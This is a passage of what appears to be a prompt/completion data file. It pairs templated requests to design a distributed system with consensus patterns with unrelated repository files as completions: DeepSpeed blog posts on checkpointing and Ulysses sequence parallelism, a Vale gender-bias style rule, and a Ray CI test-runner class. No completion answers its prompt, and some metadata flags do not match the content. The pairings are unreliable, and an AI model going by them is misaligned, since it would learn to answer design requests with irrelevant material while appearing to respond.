/>\n\n図3：さまざまなGPU数と並列戦略で*ターゲット*に*UCP*チェックポイントをロードする訓練lossの曲線（イテレーション100で保存・ロード）\n\n*UCP*が異なる並列戦略とハードウェア構成での訓練再開を可能にするかどうかをテストするために、まずTP=2、PP=2、DP=2（ZeRO-1）、SP=1の構成でGPT-3モデルを訓練します。時間とリソースの制約のため、この実験は最初の200イテレーションに限定しました。100イテレーション目で保存されたチェックポイントを*UCP*チェックポイントに変換し、異なるGPU数と並列戦略を使用してこれらの*UCP*チェックポイントで訓練を再開します。各イテレーションのLM損失（データ並列グループ全体の平均損失）を記録しました。図3は、異なる*ターゲット*並列戦略を使用して*UCP*チェックポイントで訓練をシームレスに再開し、*ソース*戦略を継続して訓練する場合と一致する収束を達成することを示しています。\n\n## 複数ソースからシングルターゲットへ\n\n<img src=\"../media/image5.png\" style=\"width:4.85477in;height:4in\" />\n\n図4：100イテレーション目で異なるソース並列戦略を*UCP*に変換し、異なるターゲットで*UCP*をロードする訓練lossの曲線\n\n図4は、複数の*ソース*構成から単一の*ターゲット*へのlossの曲線を示しています。固定されたランダムシードを使用して、まずGPT-3モデルを異なる*ソース*構成で訓練します。次に、100イテレーション目で保存された分散チェックポイントを*UCP*チェックポイントに変換し、TP=2、PP=2、DP=1、SP=1の構成でトレーニングを再開します。結果は、異なる*ソース*構成にもかかわらず、そのチェックポイントはすべて*UCP*に変換され、異なる構成で訓練を再開できることを示しています。最も重要なのは、再開されたlossの曲線が、イテレーション101～200での*ソース*の曲線と一致することです。これらの結果は、訓練再開時に任意の構成を異なる構成に変換する*UCP*の効果を検証しています。\n\n## 異なるモデルアーキテクチャへの対応\n\n*UCP*はモデルアーキテクチャに依存しません。したがって、GPTモデルとの互換性だけでなく、さまざまなモデルアーキテクチャとサイズをサポートする柔軟性も備えています。図5、6、7は、新しい並列戦略で*UCP*から訓練を再開したときのLLaMA 7B、BLOOM 176B、およびMixtral-7x8B MoEを元にしたモデルのトレーニング収束を示しています。これらの図は、トレーニングが*UCP*でシームレスに再開され、これらの多様なモデル全体で訓練の初期フェーズと一致する収束を達成することを示しています。これらの結果は、さまざまなモデルアーキテクチャとサイズに対する*UCP*の柔軟性を示しています。\n\n<img src=\"../media/image6.png\" style=\"width:5in;height:4in\" alt=\"A graph of training step Description automatically generated\" />\n\n図5：LLaMAモデルアーキテクチャの訓練lossの曲線。ソースはTP=PP=DP=2。訓練はイテレーション101で新しいターゲットTP=DP=2、PP=1およびTP=PP=2、DP=1で再開しました。\n\n<img src=\"../media/image7.png\" style=\"width:5in;height:4in\" alt=\"A graph with numbers and lines Description automatically generated\" />\n\n図6：BLOOMモデルアーキテクチャの訓練lossの曲線。ソースはTP=2、PP=24、DP=8。訓練はイテレーション94767で新しいターゲットTP=2、DP=4、PP=24で再開しました。\n\n<img src=\"../media/image8.png\" style=\"width:5in;height:4in\" alt=\"A graph of training step Description automatically generated\" />\n\n図7：Mixtral-MoEモデルアーキテクチャに基づくモデルの訓練lossの曲線。ソースはTP=1、PP=2、DP=4。訓練はイテレーション501で新しいターゲットTP=PP=DP=2で再開しました。\n\n# DeepSpeed Universal Checkpointの一般公開\n\nDeepSpeed Universal Checkpointは、リベースされたMegatron-DeepSpeedバージョンに完全に統合されており、DeepSpeedおよびMegatron-DeepSpeedのGitHubリポジトリを通じてアクセスできます。使用に関する詳細なチュートリアルは、[DeepSpeedチュートリアルページ](https://www.deepspeed.ai/tutorials/universal-checkpointing/)にあります。\n\nDeepSpeedでは、広範なオープンソースコミュニティからの貢献とコラボレーションを受け入れています。DeepSpeed Universal Checkpointは、大規模AIトレーニングおよび推論のためのDeepSpeedエコシステムの一部です。すべてのDeepSpeed技術とイノベーションについての詳細は、[ウェブサイト](https://www.deepspeed.ai/)をご覧いただき、X（旧Twitter）での[英語](https://twitter.com/DeepSpeedAI)、[日本語](https://twitter.com/DeepSpeedAI_JP)、および[中国のZhihu](https://www.zhihu.com/people/deepspeed)をフォローしてください。\n\n# 謝辞と貢献\n\nUniversity of Illinois at Urbana-Champaign、Statosphere、およびIntel Habanaとの協力に感謝します。\n\nコントリビュータ：\nXinyu Lian $^1$, Sam Ade Jacobs $^2$, Lev Kurilenko $^2$, Masahiro Tanaka $^2$, Stas Bekman $^3$, Olatunji Ruwase $^2$, Minjia Zhang $^1$, Moshe Island $^4$\n\n1: University of Illinois at Urbana-Champaign\n2: Microsoft\n3: StasoSphere\n4: Intel Habana\n", "metadata": {"source": "github.com/deepspeedai/DeepSpeed", "file_path": "blogs/deepspeed-ucp/japanese/README.md", "language": "markdown", "complexity": "medium", "star_count": 39501, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 116}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design distributed system with consensus and consistency patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "<div align=\"center\">\n\n# DeepSpeed Ulysses: System Optimizations for Enabling Training of Extreme Long Sequence Transformer Models\n\n</div>\n\n<div align=\"center\">\n<img src=\"./media/hero1.png\" width=\"780px\" />\n<img src=\"./media/hero2.png\" width=\"820px\" />\n\n</div>\n\nTo cite DeepSpeed-Ulysses, please cite our [arxiv report](https://arxiv.org/abs/2309.14509):\n\n```\n@article{jacobs2023deepspeed,\n      title={DeepSpeed Ulysses: System Optimizations for Enabling Training of Extreme Long Sequence Transformer Models},\n      author={Sam Ade Jacobs and Masahiro Tanaka and Chengming Zhang and Minjia Zhang and Shuaiwen Leon Song and Samyam Rajbhandari and Yuxiong He},\n      journal={arXiv preprint arXiv:2309.14509},\n      year={2023},\n}\n```\n\n## Introduction\n\nTraining large models with long sequences is becoming very important\nacross the board from generative AI to models for scientific discovery.\nOn generative AI side, conversational AI, long document summarization\nand video generation require reasoning over long contexts in spatial and\ntemporal domains. For example, multimodal foundation models such as ones\nthat process speech, images and waveforms concurrently require long\ncontext reasoning over high dimensional inputs with extremely large\nsequences. Similarly, chapter and book level summarization (estimated at\ntens and hundreds of thousands of words) are of great importance in\nconversational AI and abstract summarization tasks.\n\nLong sequence length is equally critical for AI for science opening\ndoors for better understanding of structure biology, health care,\nclimate and weather forecasting and large molecular simulation. For\ninstance, by adapting large language models with gene sequences, we can\ncreate language models that can learn the evolutionary patterns of\ngenomes using simple alphabets and extremely long sequences (the human\ngenome has 6.4 billion letters). In health care, diagnostic predictive\nmodel conditioned on entire patient care record requires context of\nextremely long sequence.\n\nDespite the emerging importance of long sequence length for both\ngenerative AI and AI for science, existing large model training systems\nand the underlying parallelism technologies (data, tensor, pipeline,\nsequence parallelism) are limited in their ability to support the\nefficient long sequence training. Two challenges with existing\nparallelism approach come to the fore. First, existing parallelism\napproach such as data, tensor and pipeline parallelism cannot address\nthe scaling along sequence dimension. Second, existing sequence\nparallelism approaches are not effective because of memory-communication\ninefficiencies<span class=\"mark\">.</span> Furthermore, existing\napproaches have limited usability requiring intrusive and error prone\ncode refactoring.\n\nIn this release, we are proud to introduce *DeepSpeed-Ulysses (or\nUlysses, a very long novel)*, a simple, portable, and effective\nmethodology for enabling highly efficient and scalable LLM training with\nextremely long sequence lengths.\n\nDeepSpeed-Ulysses partitions individual samples along the sequence\ndimension among participating GPU. Then right before the attention\ncomputation, it employs *all-to-all communication* collective on the\npartitioned queries, keys and values such that each GPU receives the\nfull sequence but only for a non-overlapping subset of the attention\nheads. This allows the participating GPUs to compute attention for\ndifferent attention heads in parallel. Finally, DeepSpeed-Ulysses\nemploys another all-to-all to gather the results along the attention\nheads while re-partitioning along the sequence dimension.\n\nThe key properties of DeepSpeed-Ulysses and its implementation released\nwith this blog are as follows:\n\n*  ***4x larger sequence lengths*** than existing systems, while\nenabling training with sequences with ***over a million tokens***.\n\n* Communication reduction of ***over 10x*** compared to existing\nsystems, resulting in throughput improvements of ***up to 2.5x***, and\nsustained throughput of over 175 TFlops/GPU (over 54% of hardware peak).\n\n* Fully general and implementation agnostic attention: DeepSpeed\nsequence parallelism supports dense as well as sparse\nattention, and it works with efficient attention implementations such as\nFlashAttention v2.\n\n* Support for massive model training: DeepSpeed sequence parallelism\nworks together with ZeRO-3 to not only support large sequence lengths\nbut also massive model sizes.\n\n* Easy-to-use and portable, requiring minimal code changes to the\nexisting training frameworks.\n\nIn subsequent sections, we provide detailed discussion of DeepSpeed-Ulysses\ncore design, communication complexity analysis,\nexperimental evaluation and comparison with existing work and highlight\nof usability and guide on usage.\n\n## Core Design of DeepSpeed-Ulysses\n\n<div align=\"center\">\n<img src=\"./media/image3.png\" style=\"width:6.3479in;height:2.89442in\"\nalt=\"A diagram of a computer Description automatically generated\" />\n\n*Figure 1: DeepSpeed sequence parallelism (DeepSpeed-Ulysses) design*\n</div>\n\nFigure 1 shows the core design of DeepSpeed-Ulysses. As with the known\ntransformer architecture, the design consists of input sequences *N*\npartitioned across *P* available devices. Each local *N/P* partition is\nprojected into queries (Q), keys (K) and values (V) embeddings. Next,\n(QKV) embeddings are gathered into global QKV through highly optimized\nall-to-all collectives between participating compute devices. Sequel to\nall-to-all collective is the attention computation per head in the form:\n\n$$Output\\ context = Softmax\\ (\\frac{QK^{T}}{\\sqrt{d}})V$$\n\nAfter the attention computation, another all-to-all collective\ntransforms *output context* tensor of attention computation to sequence\n(*N/P*) parallel for subsequent operators (MLP MatMul, layer norm etc)\nin the remaining modules of transformer layer block.\n\n### Significant Communication Volume Reduction\n\nWhat distinguishes DeepSpeed-Ulysses from the other existing\nlong-sequence approaches is our much smaller aggregate communication\nvolume and overall better scalability with increasing degree of sequence\nparallelism compared to existing solutions, as demonstrated by the\ncommunication volume analysis below:\n\nOn modern clusters with intra-node NVSwitch interconnect and inter-node\nfat tree IB topology, the communication volume transmitted per link for\nan all-to-all for aggregate message of size *M* over *P* GPUs is *M/P*.\nFor a transformer model with hidden size h, sequence length of N, and\nparallelism degree of P, DeepSpeed sequence parallelism performs all-to-all for the QKV\nprojections with an aggregate message size of *3Nh* before the attention\ncomputation, and another all-to-all for output context projection with a\nsize *Nh* for each transformer layer. Therefore, DeepSpeed sequence\nparallelism incurs an aggregate communication volume per link of\n***4Nh/P (or with the complexity of O(N/P).*** Note that this\ncommunication volume is constant when both N and P are increased\nproportionally.\n\nIn contrast, the existing approaches like Megatron-LM incur\ncommunication volume that increases linearly with N regardless of P,\nresulting in the ***communication complexity of O(N).*** For instance,\nMegatron-LM performs two *all-gather* with the message volume of *Nh*\nand two *reduce-scatter* with the volume of *Nh* for each transformer\nlayer. However, the cost of each all-gather and reduce-scatter of size M\nremains M when *P \\>\\> 1*, instead of *M/P*. Therefore, Megatron-LM\nsequence parallelism incurs a communication volume per link of ***4Nh***\nwhich is P times larger than that for DeepSpeed sequence parallelism.\nThis allows DeepSpeed sequence parallelism to enable training with\nextremely long sequences while achieving significantly higher training\nefficiency compared to the existing approaches. Our evaluation results\nmatch this analysis.\n\n### Additional Highlights of DeepSpeed-Ulysses\n\n***An Attention Agnostic Solution***\n\nDeepSpeed implementation of distributed attention module is general\nenough to support any attention: e.g., self-attention, cross-attention,\ncausal attention in both their dense and sparse counterparts, and their\nvarious optimized kernels that support long-sequence at local attention\nlevel such as different versions of FlashAttention.\n\nThe generality property of DeepSpeed-Ulysses stems from the modular\nnature of its core design: an attention-centric sequence parallelism\ndesign. Prior to attention computation is sequence parallelism of N/P\npartition, attention computation is head parallelism with full attention\nper head but just with fewer heads, thus attention computation can be\nreplaced with any type of attention mechanisms, e.g., dense attention\nand various forms of sparse attention.\n\n***Training Bigger Models with Longer Sequences through ZeRO-3 Integration***\n\nWhile DeepSpeed sequence parallelism reduces the activation memory when\ntraining with longer sequences, it does not impact the memory consumed\nby the model states. Therefore, to support large sequence length\ntraining with large language model, DeepSpeed sequence parallelism is\nintegrated with ZeRO-3.\n\n[ZeRO Redundancy Optimizer Stage 3 (ZeRO-3)](https://www.microsoft.com/en-us/research/blog/zero-deepspeed-new-system-optimizations-enable-training-models-with-over-100-billion-parameters/) is a memory optimization technique for training large\nmodels. Unlike the classic data parallel training of neural networks\nwhere model states are replicated across data parallel ranks, ZeRO-3\noptimizes memory usage by partitioning model states across data parallel\nranks. However, with sequence parallelism, training data can be\nconsidered in both batch (sample) and sequence dimensions and the\nassociated parallel groups combined to form a larger group for ZeRO\nparallelism.\n\nTherefore, we extend ZeRO-3 partitioning to combination of data parallel\nand sequence parallel ranks. In other words, in DeepSpeed sequence\nparallelism, ZeRO partitions model states across both sequence and data\nparallel group and collects per rank partitions (allgather) when they\nare needed. Similarly, gradients are reduced across both data and\nsequence parallel ranks for parameter update. ZeRO allows\nfor huge memory savings in both sequence and data dimensions and enables\nscaling not just to large sequence lengths but also to large models.\n\n## Evaluation\n\nWe evaluate DeepSpeed-Ulysses (Ulysses) on GPT,\na foundation model for many NLP tasks on up to 64 A100 GPUs with 40GB memory. Our\nevaluations are four-fold: i) sequence length scalability, ii)\nthroughput for dense attention and comparison with existing system, and\niii) throughput with sparse attention and comparison with existing\nsystem, iv) convergence study of DeepSpeed sequence parallelism. We discuss\nand present evaluations from each of these categories next.\n\n### Sequence Length Scalability\n\nThe first set of experiments is strong scaling of sequence length up to\n1 million tokens on 1.2 billion parameter GPT model. Results of this\nevaluation are shown in Figures 2. DeepSpeed sequence parallelism\nallows increasing sequence length linearly with the\nnumber of GPUs and\nmaintains similar computation throughput across different sequence\nlength at appropriate GPU count.\n\n<div align=\"center\">\n<img src=\"./media/dense1B1Mscale.png\" style=\"width:5in;height:4in\" />\n\n*Figure 2: DeepSpeed sequence parallelism strong scalability evaluation\nat different sequence length and GPU count.*\n</div>\n\n### Dense Attention Evaluation\n\nNext, we evaluate Ulysses on 7 billion (7B) and 30 billion (30B) parameter\nGPT dense attention models and compare against Megatron-LM's sequence\nparallelism (Megatron LM) and Colossal AI sequence parallelism (ColAI-SP) on\n32 and 64 A100 GPUs respectively. The results of these evaluations are shown\nin Figures 3 and 4.\n\nWe compare Ulysses with Megatron-LM and ColAI-SP for 7B and 30B models\nrunning various sequence lengths. We chose the sequence parallelism\ndegree and micro-batch size that produced the best performance\n(measured as TFLOPs) for the three methods, this we call optimal\n(batch size-sequence length) configurations. For Ulysses, we always\nuse a ZeRO-3 parallelism degrees of 32 and 64 for 7B and 30B models\nrespectively.\n\n\nFigures 3 and 4 show that Ulysses consistently outperforms Megatron-LM\nand ColAI-SP for the sequence length that can be run with them. In addition,\nUlysses can run longer sequence than the two existing methods. Ulysses\nperformance advantages are two folds: (1) Ulysses in combination with ZeRO-3\nparameter sharding across both data and sequence parallel groups fits more\nsamples than Megatron-LM and ColAI-SP because of the memory optimization\nleading to higher throughput (2) Ulysses benefits from efficient *all-to-all*\ncommunication relative to *all-gather* *reduce-scatter* and *ring-style* P2P\ncommunication as applied in Megatron-LM and ColAI-SP sequence parallelism.\nHowever, for dense attention at long sequence length, the throughput is\nprimarily determined by local attention computation due to quadratic\ncomputation complexity of attention, therefore performance gap between Ulysses\nand the two existing methods closes for sequence length that can be run with them.\n\n<div align=\"center\">\n<img src=\"./media/dense7B.png\" style=\"width:5in;height:4in\" />\n\n*Figure 3: Evaluation of Ulysses vs Megatron LM vs ColAI-SP on GPT-7B parameter\n model with dense attention (32 GPUs).*\n</div>\n\n<div align=\"center\">\n<img src=\"./media/dense30B.png\" style=\"width:5in;height:4in\" />\n\n*Figure 4:  Evaluation of Ulysses vs Megatron LM vs ColAI-SP on GPT-30B parameter\n model with dense attention (64 GPUs).*\n</div>\n\n### Sparse Attention Evaluation\n\nSimilarly, we evaluate Ulysses on 7 billion and 30 billion parameter sparse\nattention models and benchmark against Megatron-LM sequence parallelism.\nThere is no public implementation of block sparse attention for ColAI-SP,\ntherefore, evaluation of sparse attention is in comparison with Megatron-LM.\nResults of our evaluation are shown in Figures 5 and 6. We observe similar\ntrends with sparse attention as dense attention experiments. We observe more\nthan 2x throughput performance of Ulysses compared to Megatron-LM. For memory\nsaving, Ulysses leveraging ZeRO-3 scales to 4x longer sequence lengths\nthan Megatron-LM.\n\nUlysses outperforms Megatron-LM for sequence length that can be run with both.\nIn fact, the current Ulysses throughput is bottle-necked by the local sparse\nattention implementation, and as a result Ulysses throughput decreases as\nthe sequence length increases. We expect this gap in performance between our\nmethod and Megatron-LM to increase further for larger sequence lengths as we\nimprove the performance of the local sparse attention implementation in future.\nA noteworthy observation is that the decreasing performance gap between Ulysses\nand Megatron-LM observed in dense attention evaluation is less pronounced in\nsparse attention evaluation, because the attention computation in sparse attention\nis less dominant compared to dense attention.\n\n<div align=\"center\">\n<img src=\"./media/sparse7B.png\" style=\"width:5in;height:4in\" />\n\n*Figure 5: Evaluation of Ulysses and Megatron LM sequence parallelism on GPT-7B\nparameter model with block sparse attention (32 GPUs).*\n</div>\n\n<div align=\"center\">\n<img src=\"./media/sparse30B.png\" style=\"width:5in;height:4in\" />\n\n*Figure 6: Evaluation of Ulysses and Megatron LM sequence parallelism on GPT-30B\nparameter model with block sparse attention (64 GPUs).*\n</div>\n\n### Convergence Study\n\nLastly, Figure 7 shows convergence of a 1.3 billion GPT model at 32K\nsequence length on 8 A100 GPUs with sequence parallelism degree set at 4\nfor both DeepSpeed and Megatron-LM sequence parallelism. For DeepSpeed\nsequence parallelism, we evaluate convergence with different ZeRO\nstages. DeepSpeed sequence parallelism is a purely system optimization\ntechnique that enables training of long sequence Transformer model, thus\nthere is no (negative) impact on quality of trained models, this assertion is\nvalidated through experiments and is shown in Figure 5.\n\n<div align=\"center\">\n<img src=\"./media/convgZ.png\" width=\"500px\" />\n\n*Figure 7: Convergence evaluation of DeepSpeed sequence parallelism with different\nZeRO memory optimization stages.*\n</div>\n\n## DeepSpeed-Ulysses Software Accessibility\n\nDeepSpeed-Ulysses can be easily integrated into your code with just a\nfew lines of simple code changes. Here is an example of how to enable\nit:\n\n```python\nfrom deepspeed.sequence.layer import DistributedAttention\n\n# Replace the original self-attention (attn) with DeepSpeed-Ulysses’s self-attention\n\ndist_attn = DistributedAttention(attn, get_sequence_parallel_group())\n```\n\nCompared to other libraries that support sequence parallelism, such as\nMegatron-LM, DeepSpeed-Ulysses does not require model refactoring.\nDeepSpeed-Ulysses has been fully integrated and tested with the\nMegatron-DeepSpeed code repository. This means that if you are already\nusing this repository for training large language models, you can\nseamlessly benefit from DeepSpeed-Ulysses to train models with massive\nsequence length.\n\n## Release: Try DeepSpeed-Ulysses Today\n\nWe are excited to release DeepSpeed-Ulysses, accessible through\nDeepSpeed GitHub. Detailed tutorial on usage is available on [DeepSpeed\ntutorial page](https://www.deepspeed.ai/tutorials/ds-sequence/).\n\nWe welcome contributions and collaboration as we together push forward\non what is possible when long context window is no longer a limitation.\nDeepSpeed-Ulysses is part of the bigger DeepSpeed ecosystem of\nlarge-scale AI training and inference. For more details on all DeepSpeed\ntechnologies and innovations, please visit our [website]((https://www.deepspeed.ai/)) and follow us\non X, formerly Twitter, ([English](https://twitter.com/DeepSpeedAI), [Japanese](https://twitter.com/DeepSpeedAI_JP)) and [Chinese Zhihu](https://www.zhihu.com/people/deepspeed).\n\nWe are open to collaborations with universities, research labs, and\ncompanies. For such requests (and other requests unsuitable for GitHub),\nplease directly email to <deepspeed-info@microsoft.com>. If you like\nour work, please \"Star\" our [repo](https://github.com/deepspeedai/DeepSpeed).\n", "metadata": {"source": "github.com/deepspeedai/DeepSpeed", "file_path": "blogs/deepspeed-ulysses/README.md", "language": "markdown", "complexity": "complex", "star_count": 39501, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": true, "has_scaling": true, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": true, "line_count": 371}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "extends: substitution\nmessage: \"Consider using '%s' instead of '%s'.\"\nlink: 'https://developers.google.com/style/inclusive-documentation'\nignorecase: true\nlevel: error\naction:\n  name: replace\nswap:\n  (?:alumna|alumnus):          graduate\n  (?:alumnae|alumni):          graduates\n  air(?:m[ae]n|wom[ae]n):      pilot(s)\n  anchor(?:m[ae]n|wom[ae]n):   anchor(s)\n  authoress:                   author\n  camera(?:m[ae]n|wom[ae]n):   camera operator(s)\n  chair(?:m[ae]n|wom[ae]n):    chair(s)\n  congress(?:m[ae]n|wom[ae]n): member(s) of congress\n  door(?:m[ae]|wom[ae]n):      concierge(s)\n  draft(?:m[ae]n|wom[ae]n):    drafter(s)\n  fire(?:m[ae]n|wom[ae]n):     firefighter(s)\n  fisher(?:m[ae]n|wom[ae]n):   fisher(s)\n  fresh(?:m[ae]n|wom[ae]n):    first-year student(s)\n  garbage(?:m[ae]n|wom[ae]n):  waste collector(s)\n  lady lawyer:                 lawyer\n  ladylike:                    courteous\n  landlord:                    building manager\n  mail(?:m[ae]n|wom[ae]n):     mail carriers\n  man and wife:                husband and wife\n  man enough:                  strong enough\n  mankind:                     human kind\n  manmade:                     manufactured\n  manpower:                    personnel\n  men and girls:               men and women\n  middle(?:m[ae]n|wom[ae]n):   intermediary\n  news(?:m[ae]n|wom[ae]n):     journalist(s)\n  ombuds(?:man|woman):         ombuds\n  oneupmanship:                upstaging\n  poetess:                     poet\n  police(?:m[ae]n|wom[ae]n):   police officer(s)\n  repair(?:m[ae]n|wom[ae]n):   technician(s)\n  sales(?:m[ae]n|wom[ae]n):    salesperson or sales people\n  service(?:m[ae]n|wom[ae]n):  soldier(s)\n  steward(?:ess)?:             flight attendant\n  tribes(?:m[ae]n|wom[ae]n):   tribe member(s)\n  waitress:                    waiter\n  woman doctor:                doctor\n  woman scientist[s]?:         scientist(s)\n  work(?:m[ae]n|wom[ae]n):     worker(s)\n", "metadata": {"source": "github.com/ray-project/ray", "file_path": ".vale/styles/Google/GenderBias.yml", "language": "yaml", "complexity": "simple", "star_count": 38179, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": true, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 48}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design distributed system with consensus and consistency patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "import json\nimport os\nimport platform\nimport random\nimport shutil\nimport string\nimport subprocess\nfrom typing import List, Tuple, Optional\nfrom os import path, listdir\n\nfrom ci.ray_ci.utils import shard_tests, chunk_into_n\nfrom ci.ray_ci.utils import logger\nfrom ci.ray_ci.container import Container\nfrom ray_release.test import TestResult, Test\nfrom ray_release.test_automation.ci_state_machine import CITestStateMachine\nfrom ray_release.configs.global_config import get_global_config\n\n\n# We will run each flaky test this number of times per CI job independent of pass/fail.\nRUN_PER_FLAKY_TEST = 1\n\n\nclass TesterContainer(Container):\n    \"\"\"\n    A wrapper for running tests in ray ci docker container\n    \"\"\"\n\n    def __init__(\n        self,\n        shard_count: int = 1,\n        gpus: int = 0,\n        bazel_log_dir: str = \"/tmp\",\n        network: Optional[str] = None,\n        test_envs: Optional[List[str]] = None,\n        shard_ids: Optional[List[int]] = None,\n        skip_ray_installation: bool = False,\n        build_type: Optional[str] = None,\n        install_mask: Optional[str] = None,\n    ) -> None:\n        \"\"\"\n        :param gpu: Number of gpus to use in the container. If 0, used all gpus.\n        :param shard_count: The number of shards to split the tests into. This can be\n        used to run tests in a distributed fashion.\n        :param shard_ids: The list of shard ids to run. If none, run no shards.\n        \"\"\"\n        self.bazel_log_dir = bazel_log_dir\n        self.shard_count = shard_count\n        self.shard_ids = shard_ids or []\n        self.test_envs = test_envs or []\n        self.build_type = build_type\n        self.network = network\n        self.gpus = gpus\n\n        if not skip_ray_installation:\n            self.install_ray(build_type, install_mask)\n\n    def _create_bazel_log_mount(self, tmp_dir: Optional[str] = None) -> Tuple[str, str]:\n        \"\"\"\n        Create a temporary directory in the current container to store bazel event logs\n        produced by the test runs. We do this by using the artifact mount directory from\n        the host machine as a shared directory between all containers.\n        \"\"\"\n        tmp_dir = tmp_dir or \"\".join(\n            random.choice(string.ascii_lowercase) for _ in range(5)\n        )\n        artifact_host, artifact_container = self.get_artifact_mount()\n        bazel_log_dir_host = os.path.join(artifact_host, tmp_dir)\n        bazel_log_dir_container = os.path.join(artifact_container, tmp_dir)\n        os.mkdir(bazel_log_dir_container)\n        return (bazel_log_dir_host, bazel_log_dir_container)\n\n    def run_tests(\n        self,\n        team: str,\n        test_targets: List[str],\n        test_arg: Optional[str] = None,\n        is_bisect_run: bool = False,\n        run_flaky_tests: bool = False,\n        cache_test_results: bool = False,\n    ) -> bool:\n        \"\"\"\n        Run tests parallelly in docker.  Return whether all tests pass.\n        \"\"\"\n        # shard tests and remove empty chunks\n        chunks = list(\n            filter(\n                len,\n                [\n                    shard_tests(test_targets, self.shard_count, i)\n                    for i in self.shard_ids\n                ],\n            )\n        )\n        if not chunks:\n            # no tests to run\n            return True\n\n        # divide gpus evenly among chunks\n        gpu_ids = chunk_into_n(list(range(self.gpus)), len(chunks))\n        bazel_log_dir_host, bazel_log_dir_container = self._create_bazel_log_mount()\n        runs = [\n            self._run_tests_in_docker(\n                chunks[i],\n                gpu_ids[i],\n                bazel_log_dir_host,\n                self.test_envs,\n                test_arg=test_arg,\n                run_flaky_tests=run_flaky_tests,\n                cache_test_results=cache_test_results,\n            )\n            for i in range(len(chunks))\n        ]\n        exits = [run.wait() for run in runs]\n        self._persist_test_results(team, bazel_log_dir_container, is_bisect_run)\n        self._cleanup_bazel_log_mount(bazel_log_dir_container)\n\n        return all(exit == 0 for exit in exits)\n\n    def _persist_test_results(\n        self, team: str, bazel_log_dir: str, is_bisect_run: bool = False\n    ) -> None:\n        pipeline_id = os.environ.get(\"BUILDKITE_PIPELINE_ID\")\n        branch = os.environ.get(\"BUILDKITE_BRANCH\")\n        branch_pipelines = get_global_config()[\"ci_pipeline_postmerge\"]\n        pr_pipelines = get_global_config()[\"ci_pipeline_premerge\"]\n        if is_bisect_run:\n            logger.info(\n                \"Skip upload test results. We do not upload results on bisect runs.\"\n            )\n            return\n        if pipeline_id not in branch_pipelines + pr_pipelines:\n            logger.info(\n                \"Skip upload test results. \"\n                \"We only upload results on branch and PR pipelines\",\n            )\n            return\n        if pipeline_id in branch_pipelines and branch != \"master\":\n            logger.info(\n                \"Skip upload test results. \"\n                \"We only upload the master branch results on a branch pipeline\",\n            )\n            return\n        self._upload_build_info(bazel_log_dir)\n        TesterContainer.upload_test_results(team, bazel_log_dir)\n        TesterContainer.move_test_state(team, bazel_log_dir)\n\n    def _upload_build_info(self, bazel_log_dir) -> None:\n        logger.info(\"Uploading bazel test logs\")\n        subprocess.check_call(\n            [\n                \"bash\",\n                \"ci/build/upload_build_info.sh\",\n                bazel_log_dir,\n            ]\n        )\n\n    @classmethod\n    def upload_test_results(cls, team: str, bazel_log_dir: str) -> None:\n        for test, result in cls.get_test_and_results(team, bazel_log_dir):\n            logger.info(f\"Test {test.get_name()} run status is {result.status}\")\n            test.update_from_s3()\n            test.persist_to_s3()\n            test.persist_test_result_to_s3(result)\n\n    @classmethod\n    def move_test_state(cls, team: str, bazel_log_dir: str) -> None:\n        if get_global_config()[\"state_machine_disabled\"]:\n            return\n\n        pipeline_id = os.environ.get(\"BUILDKITE_PIPELINE_ID\")\n        branch = os.environ.get(\"BUILDKITE_BRANCH\")\n        if (\n            pipeline_id not in get_global_config()[\"ci_pipeline_postmerge\"]\n            or branch != \"master\"\n        ):\n            logger.info(\"Skip updating test state. We only update on master branch.\")\n            return\n        for test, _ in cls.get_test_and_results(team, bazel_log_dir):\n            logger.info(f\"Updating test state for {test.get_name()}\")\n            test.update_from_s3()\n            logger.info(f\"\\tOld state: {test.get_state()}\")\n            CITestStateMachine(test).move()\n            test.persist_to_s3()\n            logger.info(f\"\\tNew state: {test.get_state()}\")\n\n    @classmethod\n    def get_test_and_results(\n        cls, team, bazel_log_dir: str\n    ) -> List[Tuple[Test, TestResult]]:\n        bazel_logs = []\n        # Find all bazel logs\n        for file in listdir(bazel_log_dir):\n            log = path.join(bazel_log_dir, file)\n            if path.isfile(log) and file.startswith(\"bazel_log\"):\n                bazel_logs.append(log)\n\n        tests = {}\n        # Parse bazel logs and print test results\n        for file in bazel_logs:\n            with open(file, \"rb\") as f:\n                for line in f:\n                    event = json.loads(line.decode(\"utf-8\"))\n                    if \"testResult\" not in event:\n                        continue\n                    run_id = event[\"id\"][\"testResult\"][\"run\"]\n                    test = Test.from_bazel_event(event, team)\n                    test_result = TestResult.from_bazel_event(event)\n                    # Obtain only the final test result for a given test and run\n                    # in case the test is retried.\n                    tests[f\"{run_id}-{test.get_name()}\"] = (test, test_result)\n\n        return list(tests.values())\n\n    def _cleanup_bazel_log_mount(self, bazel_log_dir: str) -> None:\n        shutil.rmtree(bazel_log_dir)\n\n    def _run_tests_in_docker(\n        self,\n        test_targets: List[str],\n        gpu_ids: List[int],\n        bazel_log_dir_host: str,\n        test_envs: List[str],\n        test_arg: Optional[str] = 